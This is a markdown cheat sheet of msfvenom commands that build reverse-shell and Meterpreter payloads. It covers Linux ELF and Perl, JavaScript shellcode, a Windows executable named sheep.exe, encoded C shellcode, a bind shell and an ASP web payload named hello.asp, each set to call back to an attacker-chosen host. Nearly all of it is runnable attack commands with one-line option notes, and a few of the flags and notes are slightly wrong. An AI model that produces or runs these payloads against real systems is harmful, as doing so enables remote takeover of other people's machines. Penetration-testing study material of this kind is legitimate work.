# Msfvenom

```bash
msfvenom --payload-options
```

> Options: lists the payload options for msfvenom

## Non-Staged

```bash
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=<host> LPORT=<port> -b "\x00" -f elf -o non_staged_reverse_tcp
```

> Options: 32bit architecture, linux platform, linux reverse shell payload, local host, local port, bad characters, shell format (elf), output to file

## Staged

```bash
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=<host> LPORT=<port> -b "\x00" -f elf -o staged_reverse_tcp
```

> Options: 32bit architecture, linux platform, linux reverse shell payload, local host, local port, bad characters, shell format (elf), output to file

## Linux Reverse Shell

```bash
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.1.101 LPORT=<port> -b "\x00" -f elf -o rs
```

## Perl

```bash
msfvenom -a x86 --platform linux -p linux/x86/shell_reverse_tcp LHOST=<host> LPORT=<port> -b "\x00" -f perl -o plrs.pl
```

## Javascript

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.60 LPORT=<port> -f js_le
```

> Options: 32bit architecture little endian

## Windows Meterpreter

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -b "\x00" -f exe -o sheep.exe
```

> Options: windows meterpreter reverse shell payload, local host, local port, bad characters, shell format (exe), output to file

## Windows Reverse Shell

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -b "\x00" -f c
```

> Options: windows reverse shell payload, local host, local port, encode payload, bad characters, shell format (c)

## Windows Bind  Shell

```bash
msfvenom -p windows/shell_bind_tcp LHOST=<host> LPORT=<port> -e x86/shikata_ga_nai -b "\x00" -f c
```

> Options: windows bind shell payload, local host, local port, encode payload, bad characters, shell format (c)

## ASP

```bash
msfvenom -a x86 --platform window -p windows/meterpreter/reverse_tcp LHOST=<host> LPORT=<port> -f asp -o hello.asp
```

> Options: 32bit architecture, windows platform, windows reverse shell payload, local host, local port, bad characters, shell format (asp), output to file
